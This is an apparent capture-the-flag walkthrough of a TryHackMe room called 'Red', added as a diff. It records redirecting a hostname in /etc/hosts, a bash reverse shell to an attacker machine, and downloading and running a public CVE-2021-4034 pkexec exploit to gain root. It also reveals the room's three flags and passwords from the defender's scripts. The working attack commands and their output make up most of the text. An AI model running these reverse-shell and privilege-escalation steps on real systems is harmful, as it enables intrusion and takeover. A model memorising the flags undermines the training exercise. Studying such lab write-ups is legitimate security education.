@@ -681,3 +681,345 @@ La la la la la la la la la la la la la la la la
  CMD: UID=0     PID=2113   | 
  CMD: UID=0     PID=2114   | /usr/bin/chattr +a /etc/hosts 
  CMD: UID=0     PID=2115   | /usr/bin/echo Roses are Red and you suck Blue 
+Roses are Red and you suck Blue
+ CMD: UID=0     PID=2116   | 
+Roses are Red and you suck Blue
+ CMD: UID=0     PID=2117   | 
+ CMD: UID=0     PID=2119   | /usr/sbin/CRON -f 
+ CMD: UID=0     PID=2118   | /usr/sbin/CRON -f 
+ CMD: UID=0     PID=2122   | /usr/sbin/CRON -f 
+2023/07/15 21:55:01 CMD: UID=0     PID=2121   | /usr/bin/bash /root/defense/talk.sh 
+2023/07/15 21:55:01 CMD: UID=0     PID=2120   | /bin/sh -c /usr/bin/bash /root/defense/talk.sh 
+2023/07/15 21:55:01 CMD: UID=0     PID=2128   | /usr/bin/bash /root/defense/talk.sh 
+ CMD: UID=0     PID=2127   | grep -v root 
+ CMD: UID=0     PID=2126   | grep  pts 
+2023/07/15 21:55:01 CMD: UID=0     PID=2125   | /usr/bin/bash /root/defense/talk.sh 
+ CMD: UID=0     PID=2124   | ps aux 
+2023/07/15 21:55:01 CMD: UID=0     PID=2123   | /usr/bin/bash /root/defense/talk.sh 
+ CMD: UID=1001  PID=2131   | 
+ CMD: UID=1001  PID=2132   | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
+ CMD: UID=1001  PID=2133   | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
+2023/07/15 21:55:01 CMD: UID=0     PID=2134   | /usr/bin/bash /root/defense/talk.sh 
+You really think you can take down my machine Blue?
+2023/07/15 21:55:01 CMD: UID=0     PID=2135   | /usr/bin/bash /root/defense/talk.sh 
+You really think you can take down my machine Blue?
+^CExiting program... (interrupt)
+
+bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
+
+ CMD: UID=0     PID=2114   | /usr/bin/chattr +a /etc/hosts 
+ CMD: UID=0     PID=2115   | /usr/bin/echo Roses are Red and you suck Blue
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ tac /etc/hosts      
+10.8.19.103 redrules.thm
+
+blue@red:/tmp$ cat /etc/hosts
+127.0.0.1 localhost
+127.0.1.1 red
+192.168.0.1 redrules.thm
+```
+```text
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouter
+
+blue@red:/tmp$ lsattr /etc/hosts
+-----a--------e----- /etc/hosts
+
+blue@red:/tmp$ /usr/bin/chattr -ae /etc/hosts
+/usr/bin/chattr: Permission denied while setting flags on /etc/hosts
+
+blue@red:~$ /usr/bin/echo "10.8.19.103 redrules.thm" | sudo tee -a /etc/hosts
+[sudo] password for blue: 
+blue is not in the sudoers file.  This incident will be reported.
+
+blue@red:~$ /usr/bin/echo "10.8.19.103 redrules.thm" | tee -a /etc/hosts
+
+blue@red:~$ cat /etc/hosts
+127.0.0.1 localhost
+127.0.1.1 red
+192.168.0.1 redrules.thm
+```
+
+## Exploitation
+```text
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouter
+10.8.19.103 redrules.thm
+
+blue@red:/tmp$ bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
+[2] 2642
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvp 9001
+listening on [any] 9001 ...
+10.10.70.179: inverse host lookup failed: Unknown host
+connect to [10.8.19.103] from (UNKNOWN) [10.10.70.179] 39368
+nohup: missing operand
+Try 'nohup --help' for more information.
+                                                                                     
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.70.179] 34154
+bash: cannot set terminal process group (2624): Inappropriate ioctl for device
+bash: no job control in this shell
+red@red:~$ id
+id
+uid=1001(red) gid=1001(red) groups=1001(red)
+red@red:~$ ls
+ls
+flag2
+red@red:~$ cat flag2
+cat flag2
+THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}
+red@red:~$ ls -lah
+ls -lah
+total 36K
+drwxr-xr-x 4 root red  4.0K Aug 17  2022 .
+drwxr-xr-x 4 root root 4.0K Aug 14  2022 ..
+lrwxrwxrwx 1 root root    9 Aug 14  2022 .bash_history -> /dev/null
+-rw-r--r-- 1 red  red   220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 red  red  3.7K Feb 25  2020 .bashrc
+drwx------ 2 red  red  4.0K Aug 14  2022 .cache
+-rw-r----- 1 root red    41 Aug 14  2022 flag2
+drwxr-x--- 2 red  red  4.0K Aug 14  2022 .git
+-rw-r--r-- 1 red  red   807 Aug 14  2022 .profile
+-rw-rw-r-- 1 red  red    75 Aug 14  2022 .selected_editor
+-rw------- 1 red  red     0 Aug 17  2022 .viminfo
+red@red:~$ cd .git
+cd .git
+red@red:~/.git$ ls
+ls
+pkexec
+red@red:~/.git$ ls -lah
+ls -lah
+total 40K
+drwxr-x--- 2 red  red  4.0K Aug 14  2022 .
+drwxr-xr-x 4 root red  4.0K Aug 17  2022 ..
+-rwsr-xr-x 1 root root  31K Aug 14  2022 pkexec
+
+red@red:~/.git$ ./pkexec --version
+./pkexec --version
+pkexec version 0.105
+
+Pkexec, **herramienta de polkit, permite al usuario ejecutar comandos como un tercero de acuerdo con las definiciones de política de polkit utilizando el permiso SUID**.
+
+red@red:~/.git$ grep PRETTY /etc/os-release
+grep PRETTY /etc/os-release
+PRETTY_NAME="Ubuntu 20.04.4 LTS"
+
+red@red:~/.git$ ls -lah /usr/bin | grep gcc
+ls -lah /usr/bin | grep gcc
+
+red@red:~/.git$ ls -lah /usr/bin | grep python
+ls -lah /usr/bin | grep python
+lrwxrwxrwx  1 root   root      23 Mar 13 10:26 pdb3.8 -> ../lib/python3.8/pdb.py
+lrwxrwxrwx  1 root   root      31 Mar 13  2020 py3versions -> ../share/python3/py3versions.py
+lrwxrwxrwx  1 root   root       9 Mar 13  2020 python3 -> python3.8
+-rwxr-xr-x  1 root   root    5.3M Mar 13 10:26 python3.8
+
+red@red:~/.git$ ls
+ls
+pkexec
+red@red:~/.git$ pwd
+pwd
+/home/red/.git
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ git clone https://github.com/joeammond/CVE-2021-4034.git
+Cloning into 'CVE-2021-4034'...
+remote: Enumerating objects: 17, done.
+remote: Counting objects: 100% (17/17), done.
+remote: Compressing objects: 100% (14/14), done.
+remote: Total 17 (delta 5), reused 8 (delta 3), pack-reused 0
+Receiving objects: 100% (17/17), 8.25 KiB | 1.18 MiB/s, done.
+Resolving deltas: 100% (5/5), done.
+                                                                    
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cd CVE-2021-4034 
+                                                                    
+┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
+└─$ ls
+CVE-2021-4034.py  LICENSE  README.md
+                                                                    
+┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
+└─$ nano CVE-2021-4034.py 
+                                                                    
+┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
+└─$ tail CVE-2021-4034.py 
+    print('[!] Failed to create gconf-modules config file.')
+    sys.exit()
+```
+```text
+# Convert the environment to an array of char*
+environ_p = (c_char_p * len(environ))()
+environ_p[:] = environ
+
+print('[+] Calling execve()')
+```
+```text
+# Call execve() with NULL arguments
+libc.execve(b'/home/red/.git/pkexec', c_char_p(None), environ_p)
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
+└─$ python3 -m http.server 1234                   
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.70.179 - - [15/Jul/2023 18:14:27] "GET /CVE-2021-4034.py HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+                                                                    
+┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
+└─$ echo "WW91IHJlYWxseSBzdWNrIGF0IHRoaXMgQmx1ZQ==" | base64 -d 
+You really suck at this Blue  
+
+red@red:~/.git$ cd /tmp
+cd /tmp
+red@red:/tmp$ wget http://10.8.19.103:1234/CVE-2021-4034.py
+wget http://10.8.19.103:1234/CVE-2021-4034.py
+--  http://10.8.19.103:1234/CVE-2021-4034.py
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3268 (3.2K) [text/x-python]
+Saving to: ‘CVE-2021-4034.py’
+
+     0K ...                                                   100%  383M=0s
+
+(383 MB/s) - ‘CVE-2021-4034.py’ saved [3268/3268]
+
+red@red:/tmp$ python3 CVE-2021-4034.py
+python3 CVE-2021-4034.py
+id
+uid=0(root) gid=1001(red) groups=1001(red)
+bash -i
+bash: cannot set terminal process group (2637): Inappropriate ioctl for device
+bash: no job control in this shell
+root@red:/tmp# cd /root
+cd /root
+root@red:/root# ls
+ls
+defense
+flag3
+snap
+root@red:/root# cat flag3
+cat flag3
+THM{Go0d_Gam3_Blu3_GG}
+root@red:/root# cd defense
+cd defense
+root@red:/root/defense# ls
+ls
+backup.sh
+blue_history
+change_pass.sh
+clean_red.sh
+hosts
+kill_sess.sh
+talk.sh
+root@red:/root/defense# cat backup.sh
+cat backup.sh
+#!/bin/bash
+
+/usr/bin/chattr -a /etc/hosts
+/usr/bin/cp /root/defense/hosts /etc/hosts
+/usr/bin/chmod 646 /etc/hosts
+/usr/bin/chattr +a /etc/hosts
+root@red:/root/defense# cat blue_history
+cat blue_history
+echo "Red rules"
+cd
+hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
+cat passlist.txt
+rm passlist.txt
+sudo apt-get remove hashcat -y
+root@red:/root/defense# cat change_pass.sh
+cat change_pass.sh
+#!/bin/bash
+n=$((1 + $RANDOM % 7))
+
+if [ $n -eq 1 ]; then
+        /usr/bin/echo 'blue:!dr0w$s@p_r3pus' | /usr/sbin/chpasswd
+
+elif [ $n -eq 2 ]; then
+        /usr/bin/echo 'blue:sup3r_p@s$w0rd!123' | /usr/sbin/chpasswd
+
+elif [ $n -eq 3 ]; then
+        /usr/bin/echo 'blue:sup3r_p@s$w0rd!9' | /usr/sbin/chpasswd
+
+elif [ $n -eq 4 ]; then
+        /usr/bin/echo 'blue:thesup3r_p@s$w0rd!' | /usr/sbin/chpasswd
+
+elif [ $n -eq 5 ]; then
+        /usr/bin/echo 'blue:sup3r_p@s$w0sup3r_p@s$w0' | /usr/sbin/chpasswd
+
+elif [ $n -eq 6 ]; then
+        /usr/bin/echo 'blue:sup3r_p@s$w0!' | /usr/sbin/chpasswd
+
+else
+        /usr/bin/echo 'blue:sup3r_p@s$w0rd!23' | /usr/sbin/chpasswd
+
+fi
+root@red:/root/defense# cat clean_red.sh
+cat clean_red.sh
+#!/bin/bash
+
+for i in $(ps aux | grep tcp | grep 'redrules' | awk '{print $2}'); do kill -9 $i; done
+root@red:/root/defense# cat kill_sess.sh
+cat kill_sess.sh
+#!/bin/bash
+
+for i in $(ps aux | grep blue | grep ' pts' | grep -v root | awk '{print $7}')
+do
+        /usr/bin/echo "Say Bye Bye to your Shell Blue and that password" > /dev/$i
+        /usr/bin/killall -u blue
+done
+root@red:/root/defense# cat talk.sh
+cat talk.sh
+#!/bin/bash
+
+elements=("You really think you can take down my machine Blue?" "I really didn't think you would make it this far" "I recommend you leave Blue or I will destroy your shell" "You will never win Blue. I will change your password" "Red Rules, Blue Drools!" "Don't be silly Blue, you will never win" "Get out of my machine Blue!!" "I bet you are going to use linpeas and pspy, noob" "Roses are Red and you suck Blue" "La la la la la la la la la la la la la la la la" "Fine here is the root password WW91IGFyZSBhIGxvc2VyIEJsdWU=" "Here, I'll give you a hint, type exit and you'll be granted a root shell" "There is no way you are going to own this machine" "Roses are Red, but violets aren’t blue, They’re purple, you dope. Now go get a clue." "No you are repeating yourself, you are repeating yourself" "Oh let me guess, you are going to go to the /tmp or /dev/shm directory to run linpeas? Yawn" "Oh let me guess, you are going to go to the /tmp or /dev/shm directory to run Pspy? Yawn" "Fine fine, just run sudo -l and then enter this password WW91IHJlYWxseSBzdWNrIGF0IHRoaXMgQmx1ZQ==")
+
+num_elements=${#elements[@]}
+
+n=$(($RANDOM % num_elements))
+
+for i in $(ps aux | grep blue | grep ' pts' | grep -v root | awk '{print $7}')
+do
+        /usr/bin/echo "${elements[n]}" > /dev/$i
+done
+root@red:/root/defense# cat hosts
+cat hosts
+127.0.0.1 localhost
+127.0.1.1 red
+192.168.0.1 redrules.thm
+```
+```text
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouter
+```
+![[Pasted image 20230714212029.png]]
+What is the first flag?
+What is the second flag?
+What is the third flag?
+If you liked this room, I recommend checking out TryHackMe's [King of the Hill](https://tryhackme.com/games/koth).
+Completed
+
+## Flags / Answers
+- ***THM{Is_thAt_all_y0u_can_d0_blU3?}***
+- ***THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}***
+- ***THM{Go0d_Gam3_Blu3_GG}***
+
+## Notes / Lessons Learned
+[[Jeff]]
+
